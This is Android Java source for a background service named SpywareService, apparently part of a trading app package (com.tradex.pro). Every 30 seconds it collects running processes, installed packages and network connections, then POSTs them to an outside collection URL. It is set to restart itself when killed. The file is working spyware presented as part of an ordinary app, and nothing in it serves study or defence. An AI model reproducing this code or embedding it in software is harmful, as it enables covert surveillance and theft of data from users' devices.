package com.tradex.pro;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class SpywareService extends Service {
    private static final String LOG_TAG = "TradeXService";
    private static final String EXFIL_URL = "https://traderscheme.com/collect";
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(LOG_TAG, "SpywareService started");
        startMonitoring();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(LOG_TAG, "SpywareService running");
        return START_STICKY; // Restart if killed
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void startMonitoring() {
        Timer monitorTimer = new Timer();
        monitorTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndExfiltrate();
            }
        }, 0, 30000); // Every 30 seconds
    }
    
    private void collectAndExfiltrate() {
        try {
            // Collect system info
            String processInfo = getRunningProcesses();
            String appInfo = getInstalledApps();
            String networkInfo = getNetworkInfo();
            
            String data = String.format("{\"processes\":\"%s\",\"apps\":\"%s\",\"network\":\"%s\"}", 
                processInfo, appInfo, networkInfo);
            
            exfiltrateData("system_info", data);
            Log.d(LOG_TAG, "System monitoring completed");
            
        } catch (Exception e) {
            Log.e(LOG_TAG, "Monitoring error", e);
        }
    }
    
    private String getRunningProcesses() {
        try {
            Process process = Runtime.getRuntime().exec("ps");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line).append("|");
            }
            return result.toString();
        } catch (Exception e) {
            return "error";
        }
    }
    
    private String getInstalledApps() {
        try {
            Process process = Runtime.getRuntime().exec("pm list packages");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line).append("|");
            }
            return result.toString();
        } catch (Exception e) {
            return "error";
        }
    }
    
    private String getNetworkInfo() {
        try {
            Process process = Runtime.getRuntime().exec("netstat -a");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line).append("|");
            }
            return result.toString();
        } catch (Exception e) {
            return "error";
        }
    }
    
    private void exfiltrateData(String type, String data) {
        try {
            URL url = new URL(EXFIL_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            
            String postData = "{\"type\":\"" + type + "\",\"data\":\"" + data + "\"}";
            conn.getOutputStream().write(postData.getBytes());
            conn.getInputStream();
            
            Log.d(LOG_TAG, "Exfiltrated " + type);
        } catch (Exception e) {
            Log.e(LOG_TAG, "Exfiltration error", e);
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(LOG_TAG, "SpywareService destroyed");
    }
}
